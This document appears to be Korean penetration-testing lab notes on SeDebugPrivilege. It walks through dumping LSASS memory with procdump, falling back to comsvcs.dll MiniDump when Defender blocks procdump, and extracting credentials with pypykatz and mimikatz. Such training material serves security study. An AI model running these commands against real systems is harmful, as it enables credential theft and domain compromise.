# SeDebugPrivilege — 실습

- 뜻: 디버그
- 핵심: 다른 프로세스의 메모리를 읽고 쓸 수 있다. SYSTEM 프로세스에도 디버거를 붙일 수 있다.

# 1. 특권 상태 확인

- `whoami /priv | findstr /i "SeDebug"`

```text
SeDebugPrivilege              Debug programs                            Enabled
```

# 2. 실습: SYSTEM 프로세스 찾기

- `tasklist /v | findstr /i "system"`
- `tasklist /svc`

```text
lsass.exe                   1024 Services                                   0      5,200 K
winlogon.exe                 456 Console                    1      3,100 K
```

- `Get-Process lsass, winlogon -IncludeUserName`

```text
Handles NPM(K)    PM(K)  WS(K) CPU(s)   Id UserName            ProcessName
------- ------    -----  ----- ------   -- --------            -----------
    900      24     5200   8000   0.50 1024 NT AUTHORITY\SYSTEM lsass
    300      12     3100   5000   0.10  456 NT AUTHORITY\SYSTEM winlogon
```

# 3. 실습: LSASS 메모리 덤프 (procdump)

Local Security Authority Subsystem Service

- Sysinternals procdump 다운로드 (성공 시 출력 없음이 정상 → 바로 검증)

```powershell
New-Item -Path C:\temp -ItemType Directory -Force
Invoke-WebRequest -UseBasicParsing https://live.sysinternals.com/procdump.exe -OutFile C:\temp\procdump.exe
Get-Item C:\temp\procdump.exe | Select-Object Name, Length
```

```text
Name         Length
----         ------
procdump.exe   300000
```

- 덤프 실행 (SeDebug가 있어야 SYSTEM 프로세스에 접근 가능)

```powershell
C:\temp\procdump.exe -accepteula -ma (Get-Process lsass).Id C:\temp\lsass.dmp
```

```text
[00:00:00] Dumping process (1024) to C:\temp\lsass.dmp: 100%
Dump complete: 1 dump file written.
```

- 실패하면? → 특권이 Disabled인지 확인: `whoami /priv`
- Defender가 삭제하면 내장 방식 (파일 전송 불필요)

```powershell
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
```

- 덤프 파일 확인
  - `Get-ChildItem C:\temp\lsass.dmp`

```text
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a--- 10/13/2026   52428800 lsass.dmp
```

# 4. 실습: 덤프에서 자격 증명 추출 (Kali)

- `pypykatz lsa minidump /tmp/lsass.dmp`

```text
== LogonSession ==
authentication_id REDACTED
username: Administrator
domainname: TARGET
msv_creds: username REDACTED / nthash REDACTED
```

- mimikatz (Windows에서 직접)
  - `mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit`

# 5. 이해 포인트

- SeDebug가 있으면 SYSTEM 프로세스 메모리를 읽을 수 있다
- LSASS에는 로그인한 사용자의 패스워드/해시/티켓이 평문 또는 복호화 가능한 형태로 있다
- 그래서 SeDebug = 사실상 자격 증명 탈취 = 도메인 전체 장악의 시작점
